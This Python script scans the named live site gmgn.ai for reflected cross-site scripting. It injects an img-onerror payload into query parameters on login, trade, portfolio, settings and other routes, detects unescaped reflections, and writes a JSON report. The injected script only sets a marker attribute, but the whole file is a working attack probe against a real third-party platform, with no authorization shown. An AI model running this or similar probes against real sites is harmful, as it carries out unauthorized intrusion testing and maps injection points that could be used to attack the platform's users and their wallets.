from __future__ import annotations

import html
import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import Any

BASE = "https://gmgn.ai"
UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)
ROUTE_PARAMS: dict[str, tuple[str, ...]] = {
    "/": ("q", "search", "ref", "invite_code", "redirect"),
    "/login": ("redirect", "redirect_url", "returnUrl", "callback", "next", "from"),
    "/tglogin": ("redirect", "callback", "code", "state", "next", "from"),
    "/rewards": ("invite_code", "referral_code", "code", "ref", "tab", "from"),
    "/invite": ("invite_code", "referral_code", "code", "ref", "from"),
    "/referral": ("invite_code", "referral_code", "code", "ref", "from"),
    "/discover": ("q", "query", "keyword", "search", "name", "symbol", "token"),
    "/trenches": ("q", "query", "keyword", "search", "name", "symbol", "token"),
    "/trade": ("chain", "address", "token", "from", "to", "redirect"),
    "/portfolio": ("address", "wallet", "chain", "tab", "q"),
    "/watchlist": ("q", "query", "search", "name", "symbol"),
    "/profile": ("address", "user", "name", "tab", "redirect"),
    "/settings": ("tab", "redirect", "callback", "message"),
}
MAX_CASES = 80
DELAY = 0.15
CONTEXT_RADIUS = 900


def fetch(url: str) -> tuple[int | None, dict[str, str], bytes, str | None]:
    request = urllib.request.Request(
        url,
        headers={
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.8",
            "Referer": BASE + "/",
        },
    )
    try:
        with urllib.request.urlopen(request, timeout=25) as response:
            body = response.read(5_000_000)
            return (
                response.status,
                {key.lower(): value for key, value in response.headers.items()},
                body,
                None,
            )
    except urllib.error.HTTPError as exc:
        body = exc.read(1_000_000)
        return (
            exc.code,
            {key.lower(): value for key, value in exc.headers.items()},
            body,
            str(exc),
        )
    except Exception as exc:  # noqa: BLE001
        return None, {}, b"", f"{type(exc).__name__}: {exc}"


def cases() -> list[dict[str, str]]:
    output: list[dict[str, str]] = []
    index = 0
    for route, params in ROUTE_PARAMS.items():
        for param in params:
            if len(output) >= MAX_CASES:
                return output
            index += 1
            marker = f"GMGNREFLECT{index:03d}"
            payload = f'''\"><img src=x data-gmgn-marker="{marker}" onerror="document.documentElement.setAttribute('data-gmgn-ssr','{marker}')">'''
            output.append(
                {
                    "route": route,
                    "param": param,
                    "marker": marker,
                    "payload": payload,
                    "url": f"{BASE}{route}?{urllib.parse.urlencode({param: payload})}",
                }
            )
    return output


def contexts(text: str, needle: str) -> list[dict[str, Any]]:
    output: list[dict[str, Any]] = []
    start = 0
    while len(output) < 12:
        position = text.find(needle, start)
        if position < 0:
            break
        low = max(0, position - CONTEXT_RADIUS)
        high = min(len(text), position + len(needle) + CONTEXT_RADIUS)
        snippet = text[low:high]
        output.append(
            {
                "offset": position,
                "snippet": snippet,
                "compact": re.sub(r"\s+", " ", snippet),
            }
        )
        start = position + len(needle)
    return output


def classify_context(snippet: str, marker: str) -> dict[str, Any]:
    marker_pos = snippet.find(marker)
    before = snippet[:marker_pos] if marker_pos >= 0 else snippet
    after = snippet[marker_pos + len(marker) :] if marker_pos >= 0 else ""
    last_script_open = before.lower().rfind("<script")
    last_script_close = before.lower().rfind("</script")
    inside_script = last_script_open > last_script_close
    last_style_open = before.lower().rfind("<style")
    last_style_close = before.lower().rfind("</style")
    inside_style = last_style_open > last_style_close
    last_tag_open = before.rfind("<")
    last_tag_close = before.rfind(">")
    inside_tag = last_tag_open > last_tag_close
    quote_tail = before[max(0, last_tag_open) :]
    double_quotes = quote_tail.count('"')
    single_quotes = quote_tail.count("'")
    inside_double_attr = inside_tag and double_quotes % 2 == 1
    inside_single_attr = inside_tag and single_quotes % 2 == 1
    return {
        "inside_script": inside_script,
        "inside_style": inside_style,
        "inside_tag": inside_tag,
        "inside_double_quoted_attribute": inside_double_attr,
        "inside_single_quoted_attribute": inside_single_attr,
        "near_next_data": "__NEXT_DATA__" in snippet or "self.__NEXT_DATA__" in snippet,
        "near_json_script": bool(re.search(r'<script[^>]+type=["\']application/json["\']', snippet, re.I)),
        "literal_img_tag_near_marker": "<img src=x" in snippet,
        "literal_onerror_near_marker": "onerror=" in snippet,
        "escaped_lt_near_marker": "\\u003c" in snippet.lower() or "&lt;" in snippet.lower(),
        "escaped_quote_near_marker": "\\u0022" in snippet.lower() or "&quot;" in snippet.lower(),
        "following_excerpt": after[:250],
    }


def representation_hits(text: str, case: dict[str, str]) -> dict[str, Any]:
    marker = case["marker"]
    payload = case["payload"]
    escaped_json = json.dumps(payload)[1:-1]
    html_escaped = html.escape(payload, quote=True)
    js_hex = (
        payload.replace("<", "\\u003c")
        .replace(">", "\\u003e")
        .replace("&", "\\u0026")
        .replace('"', "\\u0022")
        .replace("'", "\\u0027")
    )
    representations = {
        "marker": marker,
        "raw_payload": payload,
        "json_escaped_payload": escaped_json,
        "html_escaped_payload": html_escaped,
        "js_hex_escaped_payload": js_hex,
        "url_encoded_payload": urllib.parse.quote_plus(payload),
    }
    return {
        name: {
            "present": value in text,
            "count": text.count(value) if value else 0,
        }
        for name, value in representations.items()
    }


def main() -> int:
    test_cases = cases()
    results: list[dict[str, Any]] = []
    reflected: list[dict[str, Any]] = []
    dangerous: list[dict[str, Any]] = []

    for case in test_cases:
        status, headers, body, error = fetch(case["url"])
        text = body.decode("utf-8", errors="replace")
        marker_contexts = contexts(text, case["marker"])
        classified = [
            {**item, "classification": classify_context(item["snippet"], case["marker"])}
            for item in marker_contexts
        ]
        reps = representation_hits(text, case)
        is_reflected = bool(marker_contexts)
        is_dangerous = any(
            item["classification"]["literal_img_tag_near_marker"]
            and item["classification"]["literal_onerror_near_marker"]
            and not item["classification"]["escaped_lt_near_marker"]
            for item in classified
        )
        result = {
            **case,
            "status": status,
            "error": error,
            "content_type": headers.get("content-type"),
            "bytes": len(body),
            "reflected": is_reflected,
            "dangerous_raw_html_reflection": is_dangerous,
            "representations": reps,
            "contexts": classified,
        }
        results.append(result)
        if is_reflected:
            reflected.append(result)
        if is_dangerous:
            dangerous.append(result)
        print(
            "CASE",
            json.dumps(
                {
                    "route": case["route"],
                    "param": case["param"],
                    "status": status,
                    "bytes": len(body),
                    "reflected": is_reflected,
                    "dangerous": is_dangerous,
                    "representations": reps,
                    "error": error,
                },
                sort_keys=True,
            ),
            flush=True,
        )
        if dangerous:
            break
        time.sleep(DELAY)

    report = {
        "scope": "unauthenticated public GET requests; harmless DOM marker only",
        "summary": {
            "cases_planned": len(test_cases),
            "cases_run": len(results),
            "http_200": sum(1 for result in results if result["status"] == 200),
            "http_403": sum(1 for result in results if result["status"] == 403),
            "reflected_cases": len(reflected),
            "dangerous_raw_html_reflections": len(dangerous),
            "request_errors": sum(1 for result in results if result["error"] and result["status"] is None),
        },
        "dangerous": dangerous,
        "reflected": reflected,
        "results": results,
    }
    out = Path("gmgn_ssr_reflection_scan.json")
    out.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    print(json.dumps(report["summary"], indent=2))
    for result in reflected:
        print(
            "REFLECTION",
            json.dumps(
                {
                    "route": result["route"],
                    "param": result["param"],
                    "status": result["status"],
                    "dangerous": result["dangerous_raw_html_reflection"],
                    "contexts": [
                        {
                            "classification": context["classification"],
                            "compact": context["compact"][:1200],
                        }
                        for context in result["contexts"]
                    ],
                },
                ensure_ascii=False,
                sort_keys=True,
            ),
        )
    print(f"WROTE {out} ({out.stat().st_size} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
